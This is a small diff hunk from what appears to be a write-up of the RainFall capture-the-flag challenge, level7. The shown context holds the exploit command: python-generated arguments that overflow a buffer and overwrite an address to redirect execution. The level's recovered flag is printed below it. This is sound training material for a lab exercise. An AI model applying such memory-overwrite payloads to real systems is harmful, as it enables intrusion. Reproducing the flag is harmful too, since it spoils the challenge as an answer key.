@@ -94,7 +94,6 @@ int puts(const char *s);
 ```
 
 ## Step 2: Exploiting the Binary
-
 ```bash
 level7@RainFall:~$ ./level7 "$(python -c 'print(("A" * 20) + ("\x08\x04\x99\x28"[::-1]))')" "$(python -c 'print(("\x08\x04\x84\xf4"[::-1]))')"
 5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
